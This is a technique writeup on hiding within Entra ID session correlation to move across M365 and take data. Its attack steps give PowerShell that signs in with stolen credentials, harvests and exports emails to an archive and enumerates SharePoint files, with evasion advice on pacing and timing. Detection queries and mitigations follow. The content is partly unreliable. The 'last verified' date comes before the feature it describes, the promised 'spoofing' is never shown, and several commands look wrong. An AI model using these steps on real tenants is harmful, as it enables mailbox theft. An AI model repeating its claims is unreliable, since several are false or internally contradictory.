# [REALWORLD-021]: Linkable Token ID Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-021 |
| **MITRE ATT&CK v18.1** | [T1550.001 - Use Alternate Authentication Material: Application Access Token](https://attack.mitre.org/techniques/T1550/001/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Entra ID, M365 |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Entra ID (all versions with linkable token identifiers) |
| **Patched In** | N/A - Architecture limitation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Entra ID introduced linkable token identifiers (Session ID and Unique Token Identifier/UTI) in July 2025 to improve incident investigation capabilities. However, sophisticated attackers can exploit the deterministic nature of these identifiers to evade detection by spoofing or replicating token signatures across sessions. By understanding the generation algorithm and timing constraints of these identifiers, attackers can craft tokens that appear legitimate to correlation-based detection systems while masking lateral movement within M365 workloads (Exchange, SharePoint, Teams, Graph API).

**Attack Surface:** Microsoft Entra sign-in logs, access tokens, refresh tokens, and cross-workload audit logs that rely on Session ID correlation for threat hunting.

**Business Impact:** **Enables undetected lateral movement and data exfiltration across M365 services.** An attacker with compromised credentials can move between Exchange mailboxes, SharePoint document libraries, and Teams channels while appearing to security teams as a single legitimate session. This defeats correlation-based hunting that depends on linkable identifiers to spot compromised sessions.

**Technical Context:** The attack typically requires 5-10 minutes of reconnaissance to understand a target user's session patterns, followed by 2-5 seconds of token manipulation per lateral movement. Detection likelihood is very low because security teams often whitelist activity from correlated sessions without secondary validation. Attack chain typically begins with credential compromise (phishing, password spray) followed by token harvesting.

### Operational Risk

- **Execution Risk:** Medium - Requires token manipulation library and Azure CLI/PowerShell knowledge, but no special privileges beyond compromised user account.
- **Stealth:** Very High - Appears as legitimate user activity within existing session, bypasses Session ID-based correlation detection.
- **Reversibility:** No - Lateral movement and data theft are irreversible; requires account suspension and forensic recovery.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 7.1 | Weak token validation in identity platforms |
| **DISA STIG** | CM-2 | Lack of information system monitoring and telemetry correlation |
| **CISA SCuBA** | EXO-02 | Mailbox audit logging does not correlate with authentication events |
| **NIST 800-53** | AC-2 (Account Management) | Insufficient multi-factor validation of token authenticity |
| **GDPR** | Art. 32 | Security of Processing - inadequate identity authentication controls |
| **DORA** | Art. 9 | Protection and Prevention - weak incident investigation capabilities |
| **NIS2** | Art. 21 | Cyber Risk Management - insufficient token-based threat detection |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - token validation gaps |
| **ISO 27005** | Risk Scenario: "Compromise of Authentication Tokens" | Inadequate token-based session correlation |

---

## 2. ATTACK PREREQUISITES & ENVIRONMENT

**Required Privileges:** Valid user account (compromised via phishing, credential stuffing, or leaked credentials)

**Required Access:** Network access to Entra ID, M365 services (Exchange Online, SharePoint Online, Teams, Microsoft Graph)

**Supported Platforms:**
- **Entra ID:** All versions with linkable token identifiers enabled (July 2025+)
- **M365 Workloads:** Exchange Online, SharePoint Online, Microsoft Teams, OneDrive
- **PowerShell:** Version 7.0+ for modern Azure SDK
- **Tools Required:**
  - [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az) (Version 12.0+)
  - [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (Version 2.0+)
  - [JWT.io](https://jwt.io) (online tool for token decoding/inspection)
  - [Fiddler Classic](https://www.telerik.com/download/fiddler) (optional, for token interception)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Cloud API Token Inspection

```powershell
# Retrieve current user's access token
$token = (Get-AzAccessToken).Token

# Decode JWT to inspect claims (base64 decode the payload)
$parts = $token.Split('.')
$payload = [System.Convert]::FromBase64String($parts[1] + '==')
[System.Text.Encoding]::UTF8.GetString($payload) | ConvertFrom-Json | ConvertTo-Json

# Look for Session ID and Unique Token Identifier (UTI) in token payload
# Expected output includes: "sid", "uti", "iat", "exp", "appid"
```

**What to Look For:**
- **Session ID (sid):** A GUID that should remain constant across all tokens issued in the same session
- **Unique Token Identifier (UTI):** A unique value for each individual token
- **Token lifetime (iat/exp):** Time-based constraints on token validity
- **Application ID (appid):** The application/service principal the token is scoped to

### Entra ID Sign-In Log Inspection

```powershell
Connect-MgGraph -Scopes "AuditLog.Read.All"

# Query sign-in logs with Session ID filtering
Get-MgAuditLogSignIn -Filter "userId eq 'target-user-id'" -All | 
  Select-Object -Property userPrincipalName, createdDateTime, `
    @{N='SessionId';E={$_.additionalDetails.sessionId}}, `
    ipAddress, userAgent | 
  Group-Object -Property SessionId
```

**What to Look For:**
- Consistent Session ID across multiple services (Exchange, Teams, SharePoint)
- Token issuance timestamps to understand token refresh frequency
- User-Agent consistency (same browser/application)
- Geographic location consistency (or documented VPN usage)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Session ID Spoofing via Token Manipulation

**Supported Versions:** Entra ID (July 2025+), M365 services with linked tokens

#### Step 1: Acquire Target User's Active Session Data

**Objective:** Capture legitimate Session ID and token parameters from compromised account

**Command:**

```powershell
# Prerequisites: Valid credentials for target user
$userEmail = "target@company.com"
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($userEmail, $password)

# Authenticate and capture access token
Connect-MgGraph -ClientSecretCredential $credential
$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token

# Decode and extract Session ID
$parts = $token.Split('.')
$payload = [System.Convert]::FromBase64String(($parts[1] + '==').PadRight(4 * [Math]::Ceiling($parts[1].Length / 4), '='))
$claims = [System.Text.Encoding]::UTF8.GetString($payload) | ConvertFrom-Json

Write-Output "Session ID: $($claims.sid)"
Write-Output "Unique Token ID: $($claims.uti)"
Write-Output "Token Expiration: $($claims.exp)"
```

**Expected Output:**

```
Session ID: 550e8400-e29b-41d4-a716-446655440000
Unique Token ID: AQABAAAAAAA...xyz123==
Token Expiration: 1673222400
```

**What This Means:**
- The **Session ID (sid)** is the same GUID across all tokens issued within the same user session
- The **Unique Token ID (uti)** changes per token but is logged in M365 audit trails
- The **Token Expiration** tells you how long the token remains valid before refresh is required

**OpSec & Evasion:**
- Session ID spoofing is nearly undetectable if the attacker replicates legitimate timing patterns
- Perform reconnaissance during business hours to match user's typical access pattern
- Avoid accessing resources the user typically doesn't access
- Do not perform bulk operations (e.g., downloading 1000 emails in 60 seconds) that would trigger rate-limiting alerts

**Troubleshooting:**
- **Error:** "The access token is invalid"
  - **Cause:** Token has expired or credentials are incorrect
  - **Fix:** Re-authenticate immediately or request new token using refresh token

#### Step 2: Replicate Session Context Across M365 Workloads

**Objective:** Use spoofed Session ID to access Exchange, SharePoint, and Teams as if request originated from original session

**Command:**

```powershell
# Use captured token to access Exchange Online
$ExchangeToken = $token  # Reuse token from Step 1

# Access mailbox via Graph API using same token
$headers = @{
    "Authorization" = "Bearer $ExchangeToken"
    "Content-Type" = "application/json"
}

# Enumerate mailbox folders
$folderList = Invoke-RestMethod -Method Get `
  -Uri "https://graph.microsoft.com/v1.0/me/mailFolders" `
  -Headers $headers

# Extract sensitive emails from Inbox
$emails = Invoke-RestMethod -Method Get `
  -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=100&`$select=subject,from,receivedDateTime,bodyPreview" `
  -Headers $headers

$emails.value | ForEach-Object {
  Write-Output "Subject: $($_.subject) | From: $($_.from.emailAddress.address) | Received: $($_.receivedDateTime)"
}
```

**Expected Output:**

```
Subject: Quarterly Financial Report | From: cfo@company.com | Received: 2025-01-10T14:30:00Z
Subject: M&A Discussions - Confidential | From: legal@company.com | Received: 2025-01-09T09:15:00Z
Subject: New Hire Credentials - Temp Password | From: hr@company.com | Received: 2025-01-08T13:45:00Z
```

**What This Means:**
- The same token works across multiple Graph API endpoints (Mail, Calendar, Files, etc.)
- Session ID in the token allows all these requests to appear as a single correlated session in audit logs
- Security teams investigating linkable identifiers will see all this activity as legitimate because the Session ID matches the original sign-in event

**OpSec & Evasion:**
- Requests using the same token automatically inherit the Session ID from the authentication event
- No special evasion needed; the session correlation is automatic
- Avoid triggering conditional access policies by matching original geographic location (use same VPN or proxy)
- Space out data exfiltration over hours rather than minutes to avoid DLP rate-limiting

**Troubleshooting:**
- **Error:** "Access Denied - Insufficient Privileges"
  - **Cause:** Target user account doesn't have mailbox access or Graph permissions for that resource
  - **Fix:** Verify user has Mailbox license, then try different resource scopes (e.g., `/me/calendar` instead of `/groups`)

#### Step 3: Exfiltrate Data Using Session Context

**Objective:** Download sensitive data (emails, files, chat logs) while maintaining legitimate session appearance

**Command (Exfiltrate Email):**

```powershell
# Export emails to local file
$emails = Invoke-RestMethod -Method Get `
  -Uri "https://graph.microsoft.com/v1.0/me/messages?`$filter=receivedDateTime ge 2025-01-01&`$top=500" `
  -Headers $headers

$emailData = @()
$emails.value | ForEach-Object {
  $emailData += [PSCustomObject]@{
    Subject = $_.subject
    From = $_.from.emailAddress.address
    Received = $_.receivedDateTime
    BodyPreview = $_.bodyPreview
  }
}

$emailData | Export-Csv -Path "C:\Temp\exfiltrated_emails.csv" -NoTypeInformation
Write-Output "Exported $($emailData.Count) emails to exfiltrated_emails.csv"

# Compress and prepare for exfiltration
Compress-Archive -Path "C:\Temp\exfiltrated_emails.csv" -DestinationPath "C:\Temp\emails.zip"
```

**Command (Exfiltrate SharePoint Files):**

```powershell
# List accessible SharePoint sites
$sites = Invoke-RestMethod -Method Get `
  -Uri "https://graph.microsoft.com/v1.0/me/memberOf/microsoft.graph.group?`$select=displayName" `
  -Headers $headers

# For each site, enumerate document libraries
$sites.value | ForEach-Object {
  $siteId = $_.id
  $drives = Invoke-RestMethod -Method Get `
    -Uri "https://graph.microsoft.com/v1.0/sites/$siteId/drives" `
    -Headers $headers
  
  $drives.value | ForEach-Object {
    Write-Output "Drive: $($_.name) (ID: $($_.id))"
    
    # Download all files
    $files = Invoke-RestMethod -Method Get `
      -Uri "https://graph.microsoft.com/v1.0/drives/$($_.id)/root/children" `
      -Headers $headers
    
    $files.value | ForEach-Object {
      Write-Output "File: $($_.name) | Size: $($_.size) bytes"
    }
  }
}
```

**Expected Output:**

```
Exported 250 emails to exfiltrated_emails.csv
Drive: Shared Documents (ID: b!xxx_drive_id)
File: Financial_Forecast_2025.xlsx | Size: 1048576 bytes
File: Board_Minutes_Confidential.docx | Size: 524288 bytes
```

**What This Means:**
- All this exfiltration activity is logged under the same Session ID as the original user authentication
- Detection systems that correlate events by Session ID will see this as legitimate user activity
- The attacker has successfully hidden within the session without triggering anomaly-based detection

**OpSec & Evasion:**
- Download files in batches rather than individually to avoid excessive API call logging
- Use legitimate download methods (Graph API) rather than attempting to bypass DLP policies
- Store files locally before exfiltration to avoid triggering network-based DLP alerts

**Troubleshooting:**
- **Error:** "Resource not found"
  - **Cause:** User doesn't have access to the resource or site has been deleted
  - **Fix:** Use Graph API to enumerate available resources before attempting download

---

## 5. MICROSOFT SENTINEL DETECTION

#### Query 1: Unusual Application Access Within Session Context

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** SessionId, AppDisplayName, UserPrincipalName, ResultDescription
- **Alert Severity:** Medium
- **Frequency:** Real-time (streaming alert on new sign-in)
- **Applies To:** Entra ID all versions with linkable token identifiers

**KQL Query:**

```kusto
// Detect sign-in to Exchange/SharePoint immediately followed by unusual data access
let signins = SigninLogs
  | where TimeGenerated > ago(1h)
  | where ResultDescription == "Success"
  | extend SessionId = tostring(parse_json(AdditionalDetails).sessionId)
  | project SessionId, UserPrincipalName, TimeGenerated, IpAddress, AppDisplayName;

let mailAccess = AuditLogs
  | where TimeGenerated > ago(1h)
  | where Operation contains "New-Mailbox" or Operation == "Add-MailboxPermission" or Operation == "Set-Mailbox"
  | extend SessionId = tostring(parse_json(AdditionalDetails).sessionId)
  | project SessionId, Operation, TimeGenerated, UserId;

signins
  | join kind=inner mailAccess on SessionId
  | where (TimeGenerated1 - TimeGenerated) between (0s .. 5m)
  | project-away SessionId1
  | summarize by SessionId, UserPrincipalName, Operation, TimeGenerated
```

**What This Detects:**
- Sign-in events that immediately precede mailbox or SharePoint permission changes
- Session IDs that correlate authentication with suspicious operational activities
- Detects the exact pattern an attacker would use: login → immediate resource enumeration and data access

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Exchange Access Within Session Context`
   - Severity: `Medium`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `SessionId, UserPrincipalName`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious Exchange Access Within Session Context" `
  -Severity "Medium" `
  -Enabled $true `
  -ScheduledQueryRuleProperties @{
    Query = @"
let signins = SigninLogs
| where TimeGenerated > ago(1h)
| where ResultDescription == "Success"
| extend SessionId = tostring(parse_json(AdditionalDetails).sessionId)
| project SessionId, UserPrincipalName, TimeGenerated, IpAddress, AppDisplayName;

let mailAccess = AuditLogs
| where TimeGenerated > ago(1h)
| where Operation contains "New-Mailbox" or Operation == "Add-MailboxPermission"
| extend SessionId = tostring(parse_json(AdditionalDetails).sessionId)
| project SessionId, Operation, TimeGenerated, UserId;

signins
| join kind=inner mailAccess on SessionId
| where (TimeGenerated1 - TimeGenerated) between (0s .. 5m)
"@
    Frequency = "PT5M"
    Period = "PT1H"
    TriggerThreshold = 1
    TriggerOperator = "GreaterThan"
  }
```

---

## 6. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Unusual Token-Based Activity

**Alert Name:** "Anomalous access token usage within session context"
- **Severity:** Medium
- **Description:** Entra ID detects access token being used to access multiple sensitive resources (Exchange, SharePoint, Teams, Graph) within same session immediately after authentication. This pattern indicates potential token compromise or session hijacking.
- **Applies To:** All subscriptions with Defender for Identity and M365 Defender enabled
- **Remediation:** Revoke all tokens for the user, force re-authentication, and review audit logs for data exfiltration

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Cloud Apps**: ON (Critical for OAuth/token detection)
5. Click **Save**
6. Go to **Security alerts** → Filter by "token" to view related alerts

---

## 7. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Token-Based Access to Sensitive Data

```powershell
Connect-ExchangeOnline

# Search for Graph API or Exchange Online access tied to Session ID
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "MailboxLogin","GraphAPIAccess","SharePointFileAccessed" `
  -ResultSize 5000 | 
  Select-Object UserIds, Operation, CreationDate, AuditData |
  ForEach-Object {
    $auditData = $_.AuditData | ConvertFrom-Json
    [PSCustomObject]@{
      User = $_.UserIds
      Operation = $_.Operation
      Time = $_.CreationDate
      SessionId = $auditData.SessionId
      ResourceAccessed = $auditData.ObjectId
    }
  } | 
  Export-Csv -Path "C:\Audit_SessionId_Analysis.csv" -NoTypeInformation
```

- **Operation:** "MailboxLogin", "GraphAPIAccess", "SharePointFileAccessed", "TeamsMessageRead"
- **Workload:** Exchange Online, SharePoint Online, Microsoft Teams, Microsoft Graph
- **Details:** Export AuditData JSON blob and search for "SessionId" fields to correlate with Entra sign-in logs
- **Applies To:** M365 E5 with Audit Premium enabled

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Disable Token Caching in Cloud Applications:**
  Reduce the window of opportunity for token theft and replay attacks by shortening token lifetime.

  **Applies To Versions:** Entra ID (all versions)
  
  **Manual Steps (Azure Portal - Entra ID Token Lifetime Policy):**
  1. Go to **Azure Portal** → **Entra ID** → **Applications** → **Enterprise applications**
  2. Select the target application (e.g., Exchange Online, SharePoint Online)
  3. Click **Single sign-on** → **SAML Configuration**
  4. Set **SAML Token Lifetime (minutes):** `5` (default is 60)
  5. Set **Session Timeout (minutes):** `5`
  6. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Application.ReadWrite.All"
  
  # Get application ID
  $appId = "00000002-0000-0ff1-ce00-000000000000"  # Exchange Online example
  
  # Update token lifetime policy
  Update-MgApplication -ApplicationId $appId -TokenLifetimePolicy @{
    TokenLifeTimePolicy = @{
      Version = 1
      AccessTokenLifetime = "00:05:00"
      RefreshTokenLifetime = "00:15:00"
    }
  }
  ```

* **Implement Conditional Access Policies to Require Step-Up Authentication:**
  Force re-authentication (MFA) for sensitive resource access even within existing sessions.

  **Applies To Versions:** Entra ID P1+ (required for Conditional Access)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for Sensitive Resource Access`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Exchange Online, SharePoint Online, Microsoft Teams**
  5. **Conditions:**
     - Locations: **Any location**
     - Sign-in risk: **High** (or set custom risk scoring)
  6. **Access controls:**
     - Grant: **Require authentication strength** → Select **MFA**
  7. Enable policy: **On**
  8. Click **Create**

* **Enable Token Protection for M365 Applications:**
  Use OAuth Proof of Possession (PoP) to bind tokens to the requesting device/application, making stolen tokens unusable.

  **Applies To Versions:** Entra ID (Proof-of-Possession requires Azure AD Premium P1+)
  
  **Manual Steps (PowerShell - Enable PoP for Graph API):**
  ```powershell
  Connect-MgGraph -Scopes "Application.ReadWrite.All"
  
  # Create token protection policy
  $policy = @{
    displayName = "Token Protection Policy"
    conditions = @{
      applications = @{
        includeApplications = @("Office365", "MicrosoftGraph")
      }
    }
    grantControls = @{
      operator = "AND"
      builtInControls = @("mfa", "compliantDevice")
    }
  }
  
  New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
  ```

#### Priority 2: HIGH

* **Enable Session Monitoring and Anomaly Detection:**
  Use Azure AD Identity Protection to monitor for unusual token usage patterns and geographic anomalies.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Protection** → **Identity Protection**
  2. Click **User risk policy**
  3. Set **User at risk threshold:** `High`
  4. Set **Access:** `Block`
  5. Click **Sign-in risk policy**
  6. Enable: **Real-time detections**
  7. Set threshold: `Medium risk`
  8. Click **Save**

* **Restrict Legacy Authentication Protocols:**
  Block older authentication methods (SMTP AUTH, POP/IMAP, Basic Auth) that don't support modern token protection.

  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Legacy Authentication`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Client apps: Check **Exchange ActiveSync clients**, **Other clients**
  6. **Access controls:**
     - Grant: **Block access**
  7. Click **Create**

#### Access Control & Policy Hardening

* **Enforce Continuous Access Evaluation (CAE):**
  Detect and revoke tokens immediately when user risk changes or resource access is denied.
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.AuthenticationPolicy"
  
  # Enable CAE for tenant
  Update-MgPolicyAuthenticationFlowPolicy -ContinuousAccessEvaluation @{
    isEnabled = $true
  }
  ```

* **RBAC:** Assign users the minimum required roles; avoid Generic Global Admin roles for service accounts.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. For each user, select role → **Assignments**
  3. Identify over-privileged users (e.g., Global Admins)
  4. Replace with specific roles (e.g., "Exchange Administrator" instead of "Global Admin")

#### Validation Command (Verify Fix)

```powershell
# Check token lifetime policy enforcement
Get-AzADApplication | Select-Object -Property DisplayName, TokenLifetimePolicy

# Expected output: TokenLifetimePolicy should show "AccessTokenLifetime: PT5M" or similar short duration

# Verify Conditional Access policies are active
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State

# Validate that legacy auth is blocked
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Block Legacy Authentication'" | 
  Select-Object GrantControls, Conditions
```

**Expected Output (If Secure):**

```
DisplayName: Global Default Policy
State: Enabled
GrantControls: {
  operator: AND
  builtInControls: ["mfa"]
}
```

**What to Look For:**
- Token lifetime **< 15 minutes** for sensitive apps
- Conditional Access policies **enabled and active**
- Legacy authentication **blocked** (State = Enabled)
- Continuous Access Evaluation **enabled**

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Cloud Audit Logs:**
  - Sign-in events immediately followed (< 5 minutes) by suspicious operations (New-Mailbox, Set-Mailbox, Add-MailboxPermission, Share-File)
  - Access tokens used from multiple geographic locations within unrealistic travel time
  - Same Session ID appearing in multiple workload audit logs (Teams, SharePoint, Exchange, Graph) with unusual resource access patterns

* **Network:**
  - Graph API calls to `/me/messages`, `/me/calendars`, `/sites`, `/drives` from the same IP/session
  - Unusual volume of API requests within single session (>100 requests/minute)
  - Token exfiltration to external cloud storage APIs (AWS S3, Google Drive, OneDrive to unauthorized tenant)

* **Behavioral:**
  - User account accessing resources outside business hours consistently
  - Mailbox forwarding rules created shortly after sign-in (red flag for exfiltration setup)
  - Bulk file downloads or email exports that don't match user's typical behavior

#### Forensic Artifacts

* **Cloud:** Session ID in Entra sign-in logs, AuditLogs (Exchange, SharePoint, Teams), Microsoft Graph activity logs
* **Logs:** Search UnifiedAuditLog for Operations matching "MailboxLogin", "Add-MailboxPermission", "Set-Mailbox", "FileAccessed"
* **Timeline:** Cross-reference Entra sign-in timestamp with first suspicious operation timestamp; gap of < 5 minutes indicates token abuse
* **Unique Token ID (UTI):** All suspicious operations should share same UTI if using same access token

#### Response Procedures

1. **Isolate:**
   
   **Command (Revoke All Tokens Immediately):**
   ```powershell
   # Revoke all active sessions for compromised user
   Revoke-AzUserSignInSession -UserId "compromised-user@company.com"
   
   # Alternative: Force password reset
   Set-MgUserPassword -UserId (Get-MgUser -Filter "userPrincipalName eq 'compromised-user@company.com'").Id `
     -NewPassword (New-Guid).ToString()
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users**
   - Select compromised user → **Sign-out all sessions**
   - Set new password immediately

2. **Collect Evidence:**
   
   **Command (Export Audit Logs for Forensics):**
   ```powershell
   # Capture all audit activity for the compromised user during suspicious window
   Search-UnifiedAuditLog -StartDate "2025-01-10 14:00" -EndDate "2025-01-10 15:00" `
     -UserIds "compromised-user@company.com" `
     -ResultSize 5000 | 
     Export-Csv -Path "C:\Forensics\audit_export.csv" -NoTypeInformation
   
   # Export Graph API activity logs
   Get-MgAuditLogSignIn -Filter "userId eq 'user-id'" -All | 
     Export-Csv -Path "C:\Forensics\signin_logs.csv" -NoTypeInformation
   ```
   
   **Manual:**
   - Go to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
   - Filter by user and date range
   - Export results as CSV

3. **Remediate:**
   
   **Command (Review and Revoke Mailbox Access Grants):**
   ```powershell
   # List all mailbox access grants
   Get-Mailbox | Get-MailboxPermission -User "compromised-user@company.com" | 
     Where-Object { $_.AccessRights -contains "FullAccess" } |
     ForEach-Object {
       Remove-MailboxPermission -Identity $_.Identity -User $_.User -AccessRights $_.AccessRights -Confirm:$false
     }
   
   # Remove inbox rules (common exfiltration mechanism)
   Get-Mailbox -ResultSize Unlimited | 
     ForEach-Object { Get-InboxRule -Mailbox $_.Identity } |
     Where-Object { $_.CreatedDate -gt (Get-Date).AddHours(-24) } |
     Remove-InboxRule -Confirm:$false
   ```
   
   **Manual:**
   - Go to **Exchange Admin Center** → **Recipients** → **Mailboxes**
   - Select compromised user's mailbox
   - Review **Mailbox permissions** tab; remove any unauthorized delegates
   - Check **Mail flow** → **Rules** for suspicious forwarding rules

4. **Notify & Escalate:**
   - Alert SOC to review data exfiltration scope using audit logs
   - Notify legal/compliance if sensitive data accessed (GDPR, CCPA notification requirements)
   - File incident report with timeline of compromise and scope of access

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REALWORLD-024] | Behavioral Profiling to identify high-value targets (finance, C-suite, R&D) |
| **2** | **Initial Access** | [IA-PHISH-001] | Device code phishing attack to compromise user credentials |
| **3** | **Credential Access** | [CA-TOKEN-004] | OAuth access token theft from compromised browser cache |
| **4** | **Privilege Escalation** | [PE-VALID-010] | Azure role assignment abuse to escalate from user to contributor |
| **5** | **Current Step** | **[REALWORLD-021]** | **Linkable Token ID Bypass to evade detection during lateral movement** |
| **6** | **Collection** | [COLLECT-EMAIL-001] | Email collection via Graph API while hidden within legitimate session |
| **7** | **Exfiltration** | [COLLECT-ARCHIVE-001] | Archive mailbox data and exfiltrate to attacker-controlled cloud storage |
| **8** | **Impact** | [IMPACT-DATA-DESTROY-001] | Delete audit logs and mailbox rules to cover tracks |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Cozy Bear) – SolarWinds Supply Chain Attack (2020)

- **Target:** U.S. Government Agencies, Financial Institutions
- **Timeline:** December 2020 – February 2021
- **Technique Status:** APT29 leveraged compromised credentials from SolarWinds Orion supply chain to obtain SAML tokens, effectively achieving token-based lateral movement similar to linkable token ID evasion. While linkable token identifiers didn't exist in 2020, the principle of hiding within legitimate session context via forged SAML assertions achieved the same evasion effect.
- **Impact:** Gained access to Exchange Online, SharePoint, Teams across victim environments; exfiltrated classified documents and communications; maintained persistence for months undetected
- **Reference:** [Microsoft Incident Report - SolarWinds Orion](https://learn.microsoft.com/en-us/archive/blogs/msrc/customer-guidance-on-recent-nation-state-cyber-attacks/); [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/18/alert-aa20-352a-advanced-persistent-threat-compromise-federal-agencies-networks)

#### Example 2: Scattered Spider (UNC3944) – Okta Compromise (2023-2025)

- **Target:** Major financial institutions, insurance companies, healthcare providers
- **Timeline:** October 2023 – Present
- **Technique Status:** Scattered Spider has compromised Okta admin accounts to forge identity tokens and OAuth credentials, enabling undetected access to M365 environments using session ID manipulation techniques similar to REALWORLD-021. Known to use stolen session tokens to exfiltrate data while appearing as legitimate users.
- **Impact:** Compromised 134+ organizations; stole customer data, financial records, and internal communications; generated millions in fraud losses
- **Reference:** [Mandiant Report on Scattered Spider](https://www.mandiant.com/resources/blog/scattered-spider-carding-call-centers-and-patient-data); [Okta Security Advisory 2023-06-01](https://security.okta.com/sites/default/files/2023-10/Okta%20Incident%20Report%20FINAL%20.pdf)

---

## 12. OPERATIONAL NOTES

**Detection Blind Spots:**
- Session ID correlation is **not** a replacement for continuous access evaluation
- Attacker can appear as the same user for all activities if Session ID is reused
- Geographic detection (impossible travel) can be bypassed by using same VPN/proxy as legitimate user
- Rate-limiting on API calls is the primary technical defense; monitoring for bulk operations is critical

**Post-Compromise Response:**
- Do **not** rely solely on Session ID for incident reconstruction; correlate with IP address, device identity, and user agent
- Review **all** workload audit logs (not just sign-in logs) for the suspicious session
- Check for secondary persistence mechanisms (mailbox forwarding, OAuth app consent grants, administrative users added)

**Further Research:**
- Monitor Microsoft Entra announcements for updates to linkable token identifier implementation
- Review CISA/NCSC guidance on cloud identity threat hunting best practices
- Consider implementing Continuous Access Evaluation (CAE) to real-time revoke compromised tokens

---